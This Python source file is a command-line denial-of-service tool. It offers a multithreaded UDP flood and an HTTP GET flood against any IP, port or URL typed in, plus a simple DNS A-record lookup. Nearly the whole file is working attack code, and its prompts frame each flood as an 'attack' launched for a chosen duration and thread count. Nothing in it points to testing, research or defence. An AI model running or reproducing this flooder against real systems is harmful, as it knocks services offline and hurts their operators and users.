import os
import sys
import time
import threading
import socket
import requests
import dns.resolver

# Animation for Loading
def animate():
    for c in "|/-\\":
        sys.stdout.write(f'\rLoading {c}')
        sys.stdout.flush()
        time.sleep(0.1)

# Function to display the banner
def display_banner():
    with open("assets/banner.txt", "r") as file:
        print(file.read())
    print("\nType 'help' to see available commands.")

# UDP Flood Function (Layer 4)
def udp_flood(target_ip, target_port, duration, threads):
    udp_message = b'X' * 1024
    def flood():
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                client.sendto(udp_message, (target_ip, target_port))
            except Exception as e:
                print(f"Error: {e}")
    for _ in range(threads):
        thread = threading.Thread(target=flood)
        thread.start()

# HTTP Flood Function (Layer 7)
def http_flood(target_url, duration, threads):
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    def flood():
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                response = requests.get(target_url, headers=headers)
                print(f"Request sent with status: {response.status_code}")
            except Exception as e:
                print(f"Error: {e}")
    for _ in range(threads):
        thread = threading.Thread(target=flood)
        thread.start()

# DNS Lookup Function (Lookups)
def dns_lookup(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        for ipval in result:
            print(f"DNS Record: {ipval.to_text()}")
    except Exception as e:
        print(f"Error: {e}")

# Help Command Function
def show_help():
    print("""
    Available Commands:
    - layer4: Launch a Layer 4 (UDP Flood) attack
    - layer7: Launch a Layer 7 (HTTP Flood) attack
    - lookup: Perform DNS/WHOIS lookup on a domain
    - help: Show this help message
    - exit: Exit the program
    """)

# Main Execution Flow
if __name__ == "__main__":
    display_banner()
    while True:
        command = input("\nEnter command: ").lower()

        if command == "help":
            show_help()

        elif command == "layer4":
            target_ip = input("Enter Target IP: ")
            target_port = int(input("Enter Target Port: "))
            duration = int(input("Enter Attack Duration (seconds): "))
            threads = int(input("Enter number of threads: "))
            print("Launching Layer 4 attack...")
            animate()
            udp_flood(target_ip, target_port, duration, threads)

        elif command == "layer7":
            target_url = input("Enter Target URL: ")
            duration = int(input("Enter Attack Duration (seconds): "))
            threads = int(input("Enter number of threads: "))
            print("Launching Layer 7 attack...")
            animate()
            http_flood(target_url, duration, threads)

        elif command == "lookup":
            domain = input("Enter Domain for DNS lookup: ")
            print("Performing DNS lookup...")
            animate()
            dns_lookup(domain)

        elif command == "exit":
            print("Exiting...")
            sys.exit()

        else:
            print("Unknown command. Type 'help' for a list of commands.")